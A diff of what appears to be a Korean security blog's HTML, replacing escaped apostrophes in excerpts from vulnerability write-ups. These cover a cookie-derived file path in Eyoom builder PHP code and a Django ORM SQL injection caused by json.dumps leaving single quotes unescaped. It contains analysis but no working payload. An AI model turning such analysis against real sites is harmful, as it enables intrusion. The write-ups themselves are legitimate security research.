-&lt;p&gt;&lt;strong&gt;⑦ 기타 생략 동작&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;⑦ 기타 동작&lt;/strong&gt;&lt;/p&gt;
 
 &lt;ul&gt;
   &lt;li&gt;앱 정보 수집
@@ -688,20 +1405,20 @@
 &lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cd&quot;&gt;/**
  * 유니크 아이디 쿠키 생성
  */&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;get_cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;unique_theme_id&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-    &lt;span class=&quot;nv&quot;&gt;$unique_theme_id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;get_cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;unique_theme_id&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;get_cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'unique_theme_id'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;nv&quot;&gt;$unique_theme_id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;get_cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'unique_theme_id'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
 &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-    &lt;span class=&quot;nv&quot;&gt;$unique_theme_id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;YmdHis&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str_pad&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;microtime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;STR_PAD_LEFT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-    &lt;span class=&quot;nf&quot;&gt;set_cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;unique_theme_id&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$unique_theme_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3600&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;nv&quot;&gt;$unique_theme_id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'YmdHis'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str_pad&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;microtime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;STR_PAD_LEFT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;nf&quot;&gt;set_cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'unique_theme_id'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$unique_theme_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3600&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
 &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
 
-&lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tmp_path&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;/&apos;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;REMOTE_ADDR&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;.&apos;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$unique_theme_id&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;.php&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tmp_path&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'/'&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'REMOTE_ADDR'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'.'&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$unique_theme_id&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'.php'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
 &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;file_exists&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
     &lt;span class=&quot;k&quot;&gt;include_once&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
     &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$is_shop_theme&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-        &lt;span class=&quot;nv&quot;&gt;$arr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;theme&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;       &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$user_config&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;theme&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+        &lt;span class=&quot;nv&quot;&gt;$arr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'theme'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;       &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$user_config&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'theme'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
     &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-        &lt;span class=&quot;nv&quot;&gt;$arr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;shop_theme&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$user_config&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;shop_theme&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+        &lt;span class=&quot;nv&quot;&gt;$arr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'shop_theme'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$user_config&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'shop_theme'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
     &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
 &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
 &lt;span class=&quot;nv&quot;&gt;$_config&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$arr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
@@ -709,7 +1426,7 @@
 &lt;span class=&quot;cd&quot;&gt;/**
  * 파일 생성 및 갱신
  */&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;parent&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;save_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;user_config&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_config&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;parent&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;save_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'user_config'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_config&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;쿠키 값으로부터 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$unique_theme_id&lt;/code&gt; 값을 받아오고, 다시 그 값은 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$file&lt;/code&gt; 변수에 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$unique_theme_id&lt;/code&gt;에 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.php&lt;/code&gt; 라는 확장자가 더해져 특정 파일의 경로가 삽입됩니다.&lt;/p&gt;
@@ -730,9 +1447,9 @@
  * 배열을 지정한 파일로 저장 - 폴더에 웹서버의 쓰기 권한이 있어야 함
  */&lt;/span&gt;
 &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;save_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$outvar&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$info&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$int&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-    &lt;span class=&quot;nv&quot;&gt;$fp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;fopen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;w&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;nv&quot;&gt;$fp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;fopen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'w'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
     &lt;span class=&quot;nv&quot;&gt;$contents&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;?php&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-    &lt;span class=&quot;nv&quot;&gt;$contents&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;if (!defined(&apos;_EYOOM_&apos;)) exit;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;nv&quot;&gt;$contents&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;if (!defined('_EYOOM_')) exit;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
     &lt;span class=&quot;nv&quot;&gt;$contents&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\$&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$outvar&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot; = array(&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
     &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$info&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
         &lt;span class=&quot;k&quot;&gt;foreach&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$info&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
@@ -744,7 +1461,7 @@
                     &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
                 &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$contents&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\t\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; =&amp;gt; &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;addslashes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
             &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-                &lt;span class=&quot;nv&quot;&gt;$arr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+                &lt;span class=&quot;nv&quot;&gt;$arr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                 &lt;span class=&quot;k&quot;&gt;foreach&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$value&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$k&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$v&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                     &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                         &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;is_int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
@@ -767,7 +1484,7 @@
 &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;또 코드를 보시면 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$value&lt;/code&gt; 값은 모두 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;addslashes()&lt;/code&gt; 함수로 필터링 되고 있습니다. 그리고 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$key&lt;/code&gt; 값은 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;save_file()&lt;/code&gt; 함수 호출 전의 값을 확인해보시면 알 수 있는 것으로, 이윰빌더의 설정 값(&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$arr[&apos;theme&apos;]&lt;/code&gt;)에 해당합니다. 이 값은 사용자 측에서 조작할 수 없는 값입니다.&lt;/p&gt;
+&lt;p&gt;또 코드를 보시면 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$value&lt;/code&gt; 값은 모두 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;addslashes()&lt;/code&gt; 함수로 필터링 되고 있습니다. 그리고 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$key&lt;/code&gt; 값은 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;save_file()&lt;/code&gt; 함수 호출 전의 값을 확인해보시면 알 수 있는 것으로, 이윰빌더의 설정 값(&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$arr['theme']&lt;/code&gt;)에 해당합니다. 이 값은 사용자 측에서 조작할 수 없는 값입니다.&lt;/p&gt;
 
 &lt;p&gt;때문에 위에서 본 코드 만으로는 임의 파일 작성 취약점을 LFI와 RCE 취약점으로 연계할 수 없다는 결론이 나옵니다.&lt;/p&gt;
 
@@ -1528,7 +2245,7 @@ SAD는 Bureau 121의 소행으로 추정하고 있지만, 뒷덜미를 잡을만
 
 &lt;p&gt;&lt;img src=&quot;/assets/2022-12-16-analyzing-django-orm-with-1-day/18.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;이 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;compile_json_path()&lt;/code&gt; 함수는 인자로 받은 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;key_trancsforms&lt;/code&gt; 값이 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;int()&lt;/code&gt;를 호출할 때 Exception이 난다면 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;json.dumps()&lt;/code&gt; 를 통해 변수를 JSON 형식으로 저장해 반환해줍니다. 이때 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;json.dumps()&lt;/code&gt;는 백슬래시와 더블쿼터를 escape처리하는데, 싱글쿼터(&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&apos;&lt;/code&gt;)는 백슬래시를 통해 처리되지 않기 때문에 SQL Query에 영향을 끼칠 수 있습니다.&lt;/p&gt;
+&lt;p&gt;이 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;compile_json_path()&lt;/code&gt; 함수는 인자로 받은 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;key_trancsforms&lt;/code&gt; 값이 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;int()&lt;/code&gt;를 호출할 때 Exception이 난다면 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;json.dumps()&lt;/code&gt; 를 통해 변수를 JSON 형식으로 저장해 반환해줍니다. 이때 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;json.dumps()&lt;/code&gt;는 백슬래시와 더블쿼터를 escape처리하는데, 싱글쿼터(&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;'&lt;/code&gt;)는 백슬래시를 통해 처리되지 않기 때문에 SQL Query에 영향을 끼칠 수 있습니다.&lt;/p&gt;
 
 &lt;h2 id=&quot;5-5-boom&quot;&gt;5-5. BOOM!&lt;/h2&gt;
 
